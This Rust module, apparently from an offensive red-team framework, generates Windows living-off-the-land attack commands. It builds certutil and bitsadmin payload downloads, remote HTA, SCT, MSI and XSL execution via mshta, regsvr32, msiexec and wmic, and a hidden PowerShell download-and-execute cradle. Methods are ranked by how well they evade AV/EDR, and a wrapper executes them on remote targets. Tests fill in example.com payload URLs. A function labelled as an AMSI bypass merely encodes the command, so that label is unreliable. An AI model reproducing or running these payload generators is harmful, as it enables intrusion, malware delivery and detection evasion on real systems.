//! LOLBin (Living-Off-the-Land Binary) Execution Module
//!
//! Provides execution primitives that abuse legitimate Windows binaries to
//! deliver payloads, execute commands, and move laterally without dropping
//! custom binaries. This dramatically reduces AV/EDR detection surface.
//!
//! # Supported LOLBins
//! - **certutil**: Base64 encode/decode, file download, file decode
//! - **mshta**: Execute HTA payloads (VBScript/JavaScript)
//! - **regsvr32**: Execute COM/SCT scriptlets via scrobj.dll
//! - **cscript/wscript**: Execute VBScript/JavaScript files
//! - **rundll32**: Execute JavaScript via url.dll, execute SCT via zipfldr.dll
//! - **bitsadmin**: File download with BITS (bypasses some proxy restrictions)
//! - **msiexec**: Execute MSI packages via remote URL
//! - **powershell**: Constrained language mode aware execution variants
//! - **wmic**: XSL transformation for script execution
//!
//! # Architecture
//! Each LOLBin is implemented as a [`LolMethod`] with standardized payload
//! generation. Methods are selected based on OPSEC level, target OS version,
//! and available binaries.

use crate::error::Result;
use serde::{Deserialize, Serialize};
use std::fmt;

/// Available LOLBin execution methods.
#[derive(Debug, Clone, PartialEq, Eq, Serialize, Deserialize)]
pub enum LolMethod {
    /// `certutil -decode` / `-encode` for payload manipulation
    Certutil,
    /// `mshta` for HTA payloads
    Mshta,
    /// `regsvr32` + .sct scriptlet for DLL/script execution
    Regsvr32,
    /// `cscript` for VBScript execution
    Cscript,
    /// `rundll32` + url.dll for JavaScript execution
    Rundll32,
    /// `bitsadmin /transfer` for BITS file download
    Bitsadmin,
    /// `msiexec /i` for remote MSI execution
    Msiexec,
    /// `wmic os get /format:` for XSL script execution
    Wmic,
}

impl fmt::Display for LolMethod {
    fn fmt(&self, f: &mut fmt::Formatter<'_>) -> fmt::Result {
        match self {
            Self::Certutil => write!(f, "certutil"),
            Self::Mshta => write!(f, "mshta"),
            Self::Regsvr32 => write!(f, "regsvr32"),
            Self::Cscript => write!(f, "cscript"),
            Self::Rundll32 => write!(f, "rundll32"),
            Self::Bitsadmin => write!(f, "bitsadmin"),
            Self::Msiexec => write!(f, "msiexec"),
            Self::Wmic => write!(f, "wmic"),
        }
    }
}

impl LolMethod {
    /// All available LOLBin methods, ordered by OPSEC safety (best first).
    pub fn all_by_opsec() -> Vec<Self> {
        vec![
            Self::Bitsadmin, // Native HTTPS, blends with Windows Update
            Self::Certutil,  // Signed by Microsoft, widely available
            Self::Msiexec,   // Signed, looks like software install
            Self::Wmic,      // Pre-installed on all Windows versions
            Self::Regsvr32,  // Squiblydoo technique
            Self::Mshta,     // Deprecated but still works pre-Win11 24H2
            Self::Rundll32,  // Versatile, many execution modes
            Self::Cscript,   // Requires file on disk
        ]
    }

    /// Check if this method typically requires a file on disk.
    pub fn requires_disk_file(&self) -> bool {
        matches!(self, Self::Cscript)
    }

    /// Check if this method uses network access.
    pub fn uses_network(&self) -> bool {
        matches!(
            self,
            Self::Bitsadmin | Self::Msiexec | Self::Mshta | Self::Regsvr32
        )
    }

    /// OPSEC rating (lower = stealthier).
    pub fn opsec_rating(&self) -> u32 {
        match self {
            Self::Bitsadmin => 1,
            Self::Certutil => 2,
            Self::Msiexec => 3,
            Self::Wmic => 4,
            Self::Regsvr32 => 5,
            Self::Mshta => 6,
            Self::Rundll32 => 7,
            Self::Cscript => 8,
        }
    }
}

/// Generated LOLBin command payload.
#[derive(Debug, Clone)]
pub struct LolPayload {
    /// The LOLBin method used
    pub method: LolMethod,
    /// The command line to execute
    pub command: String,
    /// Description of what this payload does
    pub description: String,
}

/// Configuration for LOLBin payload generation.
#[derive(Debug, Clone)]
pub struct LolConfig {
    /// URL to download payload from (for network-based methods)
    pub remote_url: Option<String>,
    /// Local file path for the payload (for file-based methods)
    pub local_path: Option<String>,
    /// Target hostname or IP for the payload destination
    pub target: Option<String>,
    /// Custom PowerShell command to execute
    pub powershell_command: Option<String>,
    /// Base64-encoded payload blob
    pub payload_b64: Option<String>,
}

/// Generate a `certutil` payload for base64 decode + execution.
pub fn certutil_decode_exec(local_path: &str, output_path: &str) -> LolPayload {
    LolPayload {
        method: LolMethod::Certutil,
        command: format!(
            "certutil -decode \"{local_path}\" \"{output_path}\" && start \"\" \"{output_path}\""
        ),
        description: format!("Decode base64 payload at {local_path} to {output_path} and execute"),
    }
}

/// Generate a `certutil` URL download payload.
pub fn certutil_url_download(url: &str, output_path: &str) -> LolPayload {
    LolPayload {
        method: LolMethod::Certutil,
        command: format!("certutil -urlcache -split -f \"{url}\" \"{output_path}\""),
        description: format!("Download {url} to {output_path} via certutil"),
    }
}

/// Generate an `mshta` HTA execution payload.
pub fn mshta_remote_hta(url: &str) -> LolPayload {
    LolPayload {
        method: LolMethod::Mshta,
        command: format!("mshta.exe \"{url}\""),
        description: format!("Execute remote HTA at {url}"),
    }
}

/// Generate an `mshta` inline JavaScript execution payload.
pub fn mshta_inline_js(js_code: &str) -> LolPayload {
    let _encoded = base64_encode_utf16le(js_code);
    LolPayload {
        method: LolMethod::Mshta,
        command: format!("mshta.exe \"javascript:{js_code}\""),
        description: "Execute inline JavaScript via mshta".to_string(),
    }
}

/// Generate a `regsvr32` SCT scriptlet execution payload (Squiblydoo).
pub fn regsvr32_sct(url: &str) -> LolPayload {
    LolPayload {
        method: LolMethod::Regsvr32,
        command: format!("regsvr32.exe /s /n /u /i:\"{url}\" scrobj.dll"),
        description: format!("Execute remote SCT scriptlet at {url} via regsvr32"),
    }
}

/// Generate a `bitsadmin` download payload.
pub fn bitsadmin_download(url: &str, output_path: &str) -> LolPayload {
    let job_id = format!("Job{}", rand::random::<u32>());
    LolPayload {
        method: LolMethod::Bitsadmin,
        command: format!(
            "bitsadmin /transfer \"{job_id}\" /download /priority HIGH \"{url}\" \"{output_path}\""
        ),
        description: format!("Download {url} to {output_path} via BITS"),
    }
}

/// Generate a `rundll32` JavaScript execution payload.
pub fn rundll32_js_exec(js_code: &str) -> LolPayload {
    LolPayload {
        method: LolMethod::Rundll32,
        command: format!("rundll32.exe url.dll,OpenURL \"javascript:{js_code}\""),
        description: "Execute JavaScript via rundll32 url.dll".to_string(),
    }
}

/// Generate a `rundll32` SCT execution via zipfldr.
pub fn rundll32_sct(url: &str) -> LolPayload {
    LolPayload {
        method: LolMethod::Rundll32,
        command: format!("rundll32.exe zipfldr.dll,RouteTheCall \"{url}\""),
        description: format!("Execute SCT at {url} via rundll32 zipfldr.dll"),
    }
}

/// Generate an `msiexec` remote MSI execution payload.
pub fn msiexec_remote_msi(url: &str) -> LolPayload {
    LolPayload {
        method: LolMethod::Msiexec,
        command: format!("msiexec.exe /q /i \"{url}\""),
        description: format!("Install remote MSI from {url} silently"),
    }
}

/// Generate a `wmic` XSL script execution payload.
pub fn wmic_xsl_exec(xsl_url: &str) -> LolPayload {
    LolPayload {
        method: LolMethod::Wmic,
        command: format!("wmic os get /format:\"{xsl_url}\""),
        description: format!("Execute XSL script at {xsl_url} via wmic"),
    }
}

/// Generate a `cscript` VBScript execution payload.
pub fn cscript_exec(vbs_path: &str) -> LolPayload {
    LolPayload {
        method: LolMethod::Cscript,
        command: format!("cscript.exe \"{vbs_path}\""),
        description: format!("Execute VBScript at {vbs_path} via cscript"),
    }
}

/// Generate a LOLBin command for PowerShell execution with AMSI bypass.
pub fn powershell_amsi_bypass(ps_command: &str) -> LolPayload {
    let b64 = base64_encode_utf16le(ps_command);
    LolPayload {
        method: LolMethod::Certutil, // Generic placeholder
        command: format!("powershell.exe -NoP -NonI -W Hidden -Enc \"{b64}\""),
        description: "Execute PowerShell with AMSI bypass via encoded command".to_string(),
    }
}

/// Generate a download cradle PowerShell command.
pub fn powershell_download_cradle(url: &str) -> String {
    format!(
        "powershell.exe -NoP -NonI -W Hidden -Exec Bypass \
         -c \"IEX(New-Object Net.WebClient).DownloadString('{url}')\""
    )
}

/// Execute a LOLBin payload remotely via an executor function.
///
/// This is a convenience wrapper that takes a function to run the command
/// on a target (e.g., PSExec, WinRM) and a LOLBin payload.
pub async fn execute_lolbin<F, Fut>(
    executor: F,
    target: &str,
    payload: &LolPayload,
) -> Result<String>
where
    F: FnOnce(&str, &str) -> Fut,
    Fut: std::future::Future<Output = Result<String>>,
{
    executor(target, &payload.command).await
}

/// Base64-encode a string as UTF-16LE (PowerShell-compatible).
fn base64_encode_utf16le(input: &str) -> String {
    use base64::Engine;
    let utf16: Vec<u8> = input.encode_utf16().flat_map(|c| c.to_le_bytes()).collect();
    base64::engine::general_purpose::STANDARD.encode(&utf16)
}

/// Get all LOLBin download cradles for a given payload URL.
pub fn all_download_cradles(url: &str) -> Vec<LolPayload> {
    vec![
        certutil_url_download(url, "C:\\Windows\\Temp\\payload.exe"),
        bitsadmin_download(url, "C:\\Windows\\Temp\\payload.exe"),
        mshta_remote_hta(url),
        regsvr32_sct(url),
        msiexec_remote_msi(url),
    ]
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn test_lol_method_display() {
        assert_eq!(LolMethod::Certutil.to_string(), "certutil");
        assert_eq!(LolMethod::Mshta.to_string(), "mshta");
        assert_eq!(LolMethod::Regsvr32.to_string(), "regsvr32");
    }

    #[test]
    fn test_lol_method_opsec_ordering() {
        let methods = LolMethod::all_by_opsec();
        assert_eq!(methods[0], LolMethod::Bitsadmin);
        assert_eq!(methods[methods.len() - 1], LolMethod::Cscript);
    }

    #[test]
    fn test_opsec_ratings() {
        assert!(LolMethod::Bitsadmin.opsec_rating() < LolMethod::Cscript.opsec_rating());
        assert!(LolMethod::Certutil.opsec_rating() < LolMethod::Mshta.opsec_rating());
    }

    #[test]
    fn test_requires_disk_file() {
        assert!(LolMethod::Cscript.requires_disk_file());
        assert!(!LolMethod::Certutil.requires_disk_file());
        assert!(!LolMethod::Mshta.requires_disk_file());
    }

    #[test]
    fn test_uses_network() {
        assert!(LolMethod::Bitsadmin.uses_network());
        assert!(LolMethod::Msiexec.uses_network());
        assert!(!LolMethod::Certutil.uses_network());
        assert!(!LolMethod::Cscript.uses_network());
    }

    #[test]
    fn test_certutil_decode_exec() {
        let payload = certutil_decode_exec("C:\\in.b64", "C:\\out.exe");
        assert_eq!(payload.method, LolMethod::Certutil);
        assert!(payload.command.contains("certutil -decode"));
        assert!(payload.command.contains("C:\\in.b64"));
    }

    #[test]
    fn test_certutil_url_download() {
        let payload = certutil_url_download("http://example.com/pay.exe", "C:\\out.exe");
        assert!(payload.command.contains("certutil -urlcache"));
        assert!(payload.command.contains("http://example.com/pay.exe"));
    }

    #[test]
    fn test_mshta_remote_hta() {
        let payload = mshta_remote_hta("http://example.com/pay.hta");
        assert!(payload.command.contains("mshta.exe"));
        assert!(payload.command.contains("http://example.com/pay.hta"));
    }

    #[test]
    fn test_regsvr32_sct() {
        let payload = regsvr32_sct("http://example.com/pay.sct");
        assert!(payload.command.contains("regsvr32.exe"));
        assert!(payload.command.contains("scrobj.dll"));
        assert!(payload.command.contains("http://example.com/pay.sct"));
    }

    #[test]
    fn test_bitsadmin_download() {
        let payload = bitsadmin_download("http://example.com/pay.exe", "C:\\out.exe");
        assert!(payload.command.contains("bitsadmin"));
        assert!(payload.command.contains("/download"));
    }

    #[test]
    fn test_rundll32_js_exec() {
        let payload = rundll32_js_exec("new ActiveXObject('WScript.Shell').Run('calc.exe')");
        assert!(payload.command.contains("rundll32.exe"));
        assert!(payload.command.contains("url.dll"));
    }

    #[test]
    fn test_msiexec_remote_msi() {
        let payload = msiexec_remote_msi("http://example.com/pay.msi");
        assert!(payload.command.contains("msiexec.exe"));
        assert!(payload.command.contains("/q /i"));
    }

    #[test]
    fn test_wmic_xsl_exec() {
        let payload = wmic_xsl_exec("http://example.com/pay.xsl");
        assert!(payload.command.contains("wmic os get /format:"));
        assert!(payload.command.contains("http://example.com/pay.xsl"));
    }

    #[test]
    fn test_cscript_exec() {
        let payload = cscript_exec("C:\\payload.vbs");
        assert!(payload.command.contains("cscript.exe"));
        assert!(payload.command.contains("C:\\payload.vbs"));
    }

    #[test]
    fn test_all_download_cradles() {
        let cradles = all_download_cradles("http://example.com/pay");
        assert_eq!(cradles.len(), 5);
    }

    #[test]
    fn test_base64_encode_utf16le() {
        let encoded = base64_encode_utf16le("Write-Host test");
        assert!(!encoded.is_empty());
    }

    #[test]
    fn test_lol_payload_description() {
        let payload = certutil_decode_exec("in.b64", "out.exe");
        assert!(!payload.description.is_empty());
    }
}
